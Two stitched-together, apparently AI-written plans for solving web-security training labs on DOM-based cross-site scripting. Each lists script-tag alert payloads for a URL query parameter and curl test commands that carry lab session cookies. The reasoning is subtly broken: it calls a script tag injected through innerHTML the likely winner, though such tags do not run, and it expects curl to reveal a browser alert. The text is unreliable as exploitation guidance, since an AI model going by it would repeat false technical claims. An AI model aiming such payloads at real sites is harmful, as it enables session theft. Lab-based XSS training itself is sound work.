The vulnerability arises from an `innerHTML` assignment in a search blog functionality, where the source of data is `location.search`. Our task is to craft a payload that triggers the `alert` function when manipulated through the URL's query string.\n\n### Step 2 \u2013 Access and Prepare\n\nWe must verify that we can access the lab environment using the provided cookies. We'll use a basic `curl` command to confirm.\n\n```bash\ncurl -i -s -k -X GET \"https://0a85001c0429e35c80b5df3400740060.web-security-academy.net/\" \\\n-H \"Cookie: t=IitAzwWzgcfI0DZZNUMTVQ%3D%3D; Authenticated_UserVerificationId=651841581DE0D84327F7BB8F19A2F516; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKx1%2FA9Y0Ntrm%2FAHEt5B5f54Vibj4BCotDIUmKxRv8U6YM48H0wh7905fSXOo%2FJtkBzlGNZN3zLHNTo0NNzdwEOux8fIcbrfw922zDd%2BwDHtLznneWq8O7u98Q8jKL4I3XlZsStIPpKB1vOvj8wOmKL\"\n```\n\nWe need to ensure the response is valid and does not yield an HTTP 500 error.\n\n### Step 3 \u2013 Identify Vulnerable Parameter\n\nThe description indicates that the `location.search` parameter is vulnerable. This corresponds to the query string part of the URL. We will craft attacks using this parameter.\n\n### Step 4 \u2013 Payloads to Test\n\nGiven the vulnerability in `innerHTML`, we can inject a script directly. Here are two potential payloads:\n\n1. `?q=<script>alert(1)</script>`\n2. `?q=\"><script>alert(1)</script>`\n\nThese payloads exploit the ability to write HTML and script content directly via `innerHTML`.\n\n### Step 5 \u2013 Execute and Observe\n\nLet's use `curl` to test these payloads by appending them to the URL, observing if the JavaScript alert box is triggered as intended.\n\n**Payload 1 Test:**\n```bash\ncurl -i -s -k -X GET \"https://0a85001c0429e35c80b5df3400740060.web-security-academy.net/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" \\\n-H \"Cookie: t=IitAzwWzgcfI0DZZNUMTVQ%3D%3D; Authenticated_UserVerificationId=651841581DE0D84327F7BB8F19A2F516; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKx1%2FA9Y0Ntrm%2FAHEt5B5f54Vibj4BCotDIUmKxRv8U6YM48H0wh7905fSXOo%2FJtkBzlGNZN3zLHNTo0NNzdwEOux8fIcbrfw922zDd%2BwDHtLznneWq8O7u98Q8jKL4I3XlZsStIPpKB1vOvj8wOmKL\"\n```\n\n**Payload 2 Test:**\n```bash\ncurl -i -s -k -X GET \"https://0a85001c0429e35c80b5df3400740060.web-security-academy.net/?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" \\\n-H \"Cookie: t=IitAzwWzgcfI0DZZNUMTVQ%3D%3D; Authenticated_UserVerificationId=651841581DE0D84327F7BB8F19A2F516; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKx1%2FA9Y0Ntrm%2FAHEt5B5f54Vibj4BCotDIUmKxRv8U6YM48H0wh7905fSXOo%2FJtkBzlGNZN3zLHNTo0NNzdwEOux8fIcbrfw922zDd%2BwDHtLznneWq8O7u98Q8jKL4I3XlZsStIPpKB1vOvj8wOmKL\"\n```\n\n### Step 6 \u2013 Result\n\nAfter executing the payloads, observe whether an alert box appears, either indicating JS execution or resulting feedback from the lab (e.g., \"Congratulations, you solved the lab!\").\n\n### Step 7 \u2013 Final Summary\n\nThe vulnerable parameter should be confirmed as `q` within the query string. The first payload is more likely to execute the alert function successfully. Document the finding and solution with confirmation of the browser's interactive behavior or specific lab message. Let's proceed with these steps to verify which payload succeeds."}

Our task is to exploit this vulnerability by crafting a payload that triggers the `alert` function.\n\n### Step 2 \u2013 Access and Prepare\n\nWe'll connect to the lab using the provided cookies to ensure we have proper access and the ability to browse the site.\n\n```bash\ncurl -i -s -k -X GET \"https://0a51007103c6b1f480f00368008800f6.web-security-academy.net/\" \\\n-H \"Cookie: t=IitAzwWzgcfI0DZZNUMTVQ%3D%3D; Authenticated_UserVerificationId=651841581DE0D84327F7BB8F19A2F516; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKx1%2FA9Y0Ntrm%2FAHEt5B5f54Vibj4BCotDIUmKxRv8U6YM48H0wh7905fSXOo%2FJtkBzlGNZN3zLHNTo0NNzdwEOux8fIcbrfw922zDd%2BwDHtLznneWq8O7u98Q8jKL4I3XlZsStIPpKB1vOvj8wOmKL\"\n```\n\nWe'll verify that the HTML structure is properly retrieved with no HTTP 500 error.\n\n### Step 3 \u2013 Identify Vulnerable Parameter\n\nFrom the lab description, `location.search` is the parameter being utilized in the `document.write` function. This typically corresponds to the URL query string.\n\n### Step 4 \u2013 Payloads to Test\n\nWe need to inject JavaScript through the URL. Here are two potential payloads:\n\n1. `?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E`\n2. `?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E`\n\nThese are URL-encoded payloads that aim to execute JavaScript upon inclusion in the `document.write` call.\n\n### Step 5 \u2013 Execute and Observe\n\nWe'll use `curl` to test these payloads in the URL's query string.\n\n**Payload 1 Test:**\n```bash\ncurl -i -s -k -X GET \"https://0a51007103c6b1f480f00368008800f6.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" \\\n-H \"Cookie: t=IitAzwWzgcfI0DZZNUMTVQ%3D%3D; Authenticated_UserVerificationId=651841581DE0D84327F7BB8F19A2F516; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKx1%2FA9Y0Ntrm%2FAHEt5B5f54Vibj4BCotDIUmKxRv8U6YM48H0wh7905fSXOo%2FJtkBzlGNZN3zLHNTo0NNzdwEOux8fIcbrfw922zDd%2BwDHtLznneWq8O7u98Q8jKL4I3XlZsStIPpKB1vOvj8wOmKL\"\n```\n\n**Payload 2 Test:**\n```bash\ncurl -i -s -k -X GET \"https://0a51007103c6b1f480f00368008800f6.web-security-academy.net/?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" \\\n-H \"Cookie: t=IitAzwWzgcfI0DZZNUMTVQ%3D%3D; Authenticated_UserVerificationId=651841581DE0D84327F7BB8F19A2F516; SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZKx1%2FA9Y0Ntrm%2FAHEt5B5f54Vibj4BCotDIUmKxRv8U6YM48H0wh7905fSXOo%2FJtkBzlGNZN3zLHNTo0NNzdwEOux8fIcbrfw922zDd%2BwDHtLznneWq8O7u98Q8jKL4I3XlZsStIPpKB1vOvj8wOmKL\"\n```\n\n### Step 6 \u2013 Result\n\nWe'll examine the response to see if the `alert` function is triggered. A successful payload would typically lead to either seeing the alert popup in a browser or an indication in the page's response content, attesting to the successful lab completion.\n\n### Step 7 \u2013 Final Summary\n\nThe vulnerable parameter is the `search` query in the URL.
